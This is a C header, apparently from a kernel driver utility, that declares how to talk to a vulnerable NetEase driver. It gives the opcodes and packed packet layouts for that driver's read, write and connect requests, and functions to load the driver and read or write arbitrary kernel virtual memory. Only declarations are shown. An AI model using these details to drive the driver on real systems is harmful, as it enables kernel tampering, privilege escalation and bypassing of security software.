/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2025
*
*  TITLE:       NETEASE.H
*
*  VERSION:     1.44
*
*  DATE:        10 Jul 2025
*
*  NetEase drivers interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// Based on https://github.com/smallzhong/NeacController
// 

#define OpCode_ReadVM 14
#define OpCode_WriteVM 70

#pragma pack(1)
typedef struct _NEAC_READ_PACKET {
    BYTE Opcode;
    PVOID Src;
    DWORD Size;
} NEAC_READ_PACKET, *PNEAC_READ_PACKET;
#pragma pack()

#pragma pack(1)
typedef struct _NEAC_WRITE_PACKET {
    BYTE Opcode;
    PVOID Dst;
    PVOID Src;
    DWORD Size;
} NEAC_WRITE_PACKET, *PNEAC_WRITE_PACKET;
#pragma pack()

#pragma pack(1)
typedef struct _NEAC_FILTER_CONNECT {
    DWORD Magic;
    DWORD Version;
    BYTE EncKey[32];
} NEAC_FILTER_CONNECT, *PNEAC_FILTER_CONNECT;
#pragma pack()

BOOL NetEaseStartVulnerableDriver(
    _In_ KDU_CONTEXT* Context);

VOID NetEaseStopVulnerableDriver(
    _In_ KDU_CONTEXT* Context);

_Success_(return != FALSE)
BOOL WINAPI NetEaseReadVirtualMemory(
    _In_ HANDLE PortHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

_Success_(return != FALSE)
BOOL WINAPI NetEaseWriteVirtualMemory(
    _In_ HANDLE PortHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);
